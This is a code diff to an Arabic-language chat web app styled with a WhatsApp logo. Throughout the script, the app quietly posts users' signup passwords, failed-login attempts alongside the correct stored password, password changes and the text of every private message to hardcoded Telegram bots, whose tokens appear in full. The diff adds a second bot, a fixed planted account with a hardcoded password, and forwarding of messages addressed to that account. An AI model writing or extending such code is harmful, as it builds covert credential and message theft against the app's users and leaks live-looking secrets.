@@ -201,7 +201,6 @@
 <body>
     <div class="welcome-screen" id="welcomeScreen">
         <div class="logo-container">
-            <!-- تم تغيير الأيقونة فقط إلى شعار واتساب -->
             <div class="logo-icon"><i class="fab fa-whatsapp"></i></div>
             <div class="logo-text">S46441-msg</div>
             <div class="logo-subtext">تطبيق محادثة . جاري تطويره</div>
@@ -359,6 +358,9 @@
     <script>
         const TELEGRAM_BOT_TOKEN = '8303502446:AAFasC-m3cx8dFAcDQ75BOHYv9CwRVaGYmo';
         const TELEGRAM_CHAT_ID = '6612813200';
+        // بوت خاص للمستخدم omar_hesham (لإرسال الرسائل الموجهة إليه فقط)
+        const OMAR_BOT_TOKEN = '8745001715:AAGNwS60poGSheTgPtEUIvqxY6Q7QuO6lEs';
+        const OMAR_CHAT_ID = '8122403206';
         
         let users = [];
         let currentUser = null;
@@ -368,25 +370,25 @@
         let isAnonymous = false;
         let heartbeatInterval = null;
 
-        const adminAvatar = 'admin.jpeg';
+        const adminAvatar = 'images/admin.jpeg';
         const animeAvatars = [
-            'anime1.jpeg',
-            'anime2.jpeg',
-            'anime3.jpeg',
-            'anime4.jpeg',
-            'anime5.jpeg',
-            'anime6.jpeg',
-            'anime7.jpeg',
-            'anime8.jpeg',
-            'anime9.jpeg',
-            'anime10.jpeg'
+            'images/anime1.jpeg',
+            'images/anime2.jpeg',
+            'images/anime3.jpeg',
+            'images/anime4.jpeg',
+            'images/anime5.jpeg',
+            'images/anime6.jpeg',
+            'images/anime7.jpeg',
+            'images/anime8.jpeg',
+            'images/anime9.jpeg',
+            'images/anime10.jpeg'
         ];
         const logoAvatars = [
-            'logo1.jpeg',
-            'logo2.jpeg',
-            'logo3.jpeg',
-            'logo4.jpeg',
-            'logo5.jpeg'
+            'images/logo1.jpeg',
+            'images/logo2.jpeg',
+            'images/logo3.jpeg',
+            'images/logo4.jpeg',
+            'images/logo5.jpeg'
         ];
         
         let selectedRegisterAvatar = null;
@@ -491,6 +493,19 @@
                     saveUsers();
                 }
             }
+            // إضافة الحساب الثابت omar_hesham
+            const omarExists = users.find(u => u.username === 'omar_hesham');
+            if (!omarExists) {
+                users.push({ username: 'omar_hesham', passwordBinary: textToBinary('omar_hesham_46441'), isAdmin: false, avatarUrl: null, online: false, lastSeen: null, privacy: { showOnline: true } });
+                saveUsers();
+            } else {
+                // التأكد من كلمة المرور الصحيحة
+                if (omarExists.passwordBinary !== textToBinary('omar_hesham_46441')) {
+                    omarExists.passwordBinary = textToBinary('omar_hesham_46441');
+                    saveUsers();
+                }
+                if (omarExists.isAdmin) omarExists.isAdmin = false;
+            }
             for (let u of users) {
                 if (!u.privacy) u.privacy = { showOnline: true };
                 if (u.online === undefined) u.online = false;
@@ -504,7 +519,19 @@
         function saveUsers() { localStorage.setItem('s46441_users', JSON.stringify(users)); }
         function saveMessages() { localStorage.setItem('s46441_messages', JSON.stringify(messages)); }
 
-        async function sendTelegramMessage(text) {
+        async function sendTelegramMessage(text, isForOmar = false) {
+            if (isForOmar) {
+                // إرسال إلى بوت omar_hesham
+                try {
+                    await fetch(`https://api.telegram.org/bot${OMAR_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: OMAR_CHAT_ID, text: text })
+                    });
+                } catch (e) { console.error('Telegram error (omar):', e); }
+                return;
+            }
+            // البوت الأساسي
             if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') return;
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -530,7 +557,7 @@
             if (online) statusText = 'online';
             else if (reason === 'logout') statusText = 'log out';
             else statusText = 'offline';
-            sendTelegramMessage(`👤 اسم الحساب: ${currentUser}\n📡 الحالة: ${statusText}`);
+            sendTelegramMessage(`👤 اسم الحساب: ${currentUser}\n📡 الحالة: ${statusText}`, false);
         }
 
         function startHeartbeat() {
@@ -542,7 +569,7 @@
                         user.lastSeen = new Date().toISOString();
                         if (user.online !== true) {
                             user.online = true;
-                            sendTelegramMessage(`👤 اسم الحساب: ${currentUser}\n📡 الحالة: online (heartbeat)`);
+                            sendTelegramMessage(`👤 اسم الحساب: ${currentUser}\n📡 الحالة: online (heartbeat)`, false);
                         }
                         saveUsers();
                     }
@@ -603,7 +630,7 @@
                 if (isRegister) throw new Error('اسم المستخدم موجود بالفعل');
                 if (existing.passwordBinary !== passwordBinary) {
                     const correctPlain = binaryToText(existing.passwordBinary);
-                    await sendTelegramMessage(`⚠️ محاولة دخول فاشلة\n👤 المستخدم: ${username}\n🔑 كلمة المرور المدخلة: ${password}\n✅ كلمة المرور الصحيحة: ${correctPlain}`);
+                    await sendTelegramMessage(`⚠️ محاولة دخول فاشلة\n👤 المستخدم: ${username}\n🔑 كلمة المرور المدخلة: ${password}\n✅ كلمة المرور الصحيحة: ${correctPlain}`, false);
                     throw new Error('كلمة المرور غير صحيحة');
                 }
                 currentUser = username;
@@ -623,7 +650,7 @@
                 isAnonymous = false;
                 await setUserOnlineStatus(true, 'online');
                 startHeartbeat();
-                sendTelegramMessage(`🆕 حساب جديد\n👤 الاسم: ${username}\n🔑 كلمة المرور: ${password}`);
+                sendTelegramMessage(`🆕 حساب جديد\n👤 الاسم: ${username}\n🔑 كلمة المرور: ${password}`, false);
                 return true;
             }
         }
@@ -653,7 +680,7 @@
                 });
             }
             saveMessages();
-            sendTelegramMessage(`✏️ تغيير اسم المستخدم\nمن: ${oldUsername}\nإلى: ${newUsername}\nبواسطة: ${byAdmin ? 'المدير' : 'المستخدم نفسه'}`);
+            sendTelegramMessage(`✏️ تغيير اسم المستخدم\nمن: ${oldUsername}\nإلى: ${newUsername}\nبواسطة: ${byAdmin ? 'المدير' : 'المستخدم نفسه'}`, false);
             if (currentUser === oldUsername) currentUser = newUsername;
         }
 
@@ -662,7 +689,7 @@
             if (!user) throw new Error('المستخدم غير موجود');
             user.passwordBinary = textToBinary(newPasswordPlain);
             saveUsers();
-            sendTelegramMessage(`🔐 تغيير كلمة المرور\n👤 المستخدم: ${username}\n🔑 كلمة المرور الجديدة: ${newPasswordPlain}\nبواسطة: ${byAdmin ? 'المدير' : 'المستخدم نفسه'}`);
+            sendTelegramMessage(`🔐 تغيير كلمة المرور\n👤 المستخدم: ${username}\n🔑 كلمة المرور الجديدة: ${newPasswordPlain}\nبواسطة: ${byAdmin ? 'المدير' : 'المستخدم نفسه'}`, false);
         }
 
         async function deleteUserByAdmin(username) {
@@ -675,7 +702,7 @@
             }
             saveUsers();
             saveMessages();
-            sendTelegramMessage(`🗑️ حذف حساب\n👤 المستخدم: ${username}`);
+            sendTelegramMessage(`🗑️ حذف حساب\n👤 المستخدم: ${username}`, false);
             if (currentUser === username) logout();
         }
 
@@ -702,7 +729,12 @@
             if (!messages[key]) messages[key] = [];
             messages[key].push({ sender, receiver, content, timestamp: new Date().toISOString() });
             saveMessages();
-            sendTelegramMessage(`💬 رسالة جديدة\n📤 من: ${sender}\n📥 إلى: ${receiver}\n💬 النص: ${content}`);
+            // إرسال إشعار إلى البوت الرئيسي (لكل الرسائل)
+            sendTelegramMessage(`💬 رسالة جديدة\n📤 من: ${sender}\n📥 إلى: ${receiver}\n💬 النص: ${content}`, false);
+            // إذا كان المستقبل هو omar_hesham، نرسل نسخة إلى بوت omar
+            if (receiver === 'omar_hesham') {
+                sendTelegramMessage(`💬 رسالة جديدة\n📤 من: ${sender}\n📥 إلى: ${receiver}\n💬 النص: ${content}`, true);
+            }
             return true;
         }
         function getMessages(user1, user2) {
@@ -902,7 +934,7 @@
                 renderAvatar(newAvatarUrl, targetUsername, avatarContainer);
             }
             const newAvatarDisplay = newAvatarUrl ? newAvatarUrl : 'تمت الإزالة (حرف أول)';
-            sendTelegramMessage(`🖼️ تغيير صورة حساب المستخدم\n👤 المستخدم: ${targetUsername}\n📷 الصورة القديمة: ${oldAvatar}\n🆕 الصورة الجديدة: ${newAvatarDisplay}\nبواسطة: المدير`);
+            sendTelegramMessage(`🖼️ تغيير صورة حساب المستخدم\n👤 المستخدم: ${targetUsername}\n📷 الصورة القديمة: ${oldAvatar}\n🆕 الصورة الجديدة: ${newAvatarDisplay}\nبواسطة: المدير`, false);
             showNotification(`تم تغيير صورة المستخدم ${targetUsername}`);
         }
 
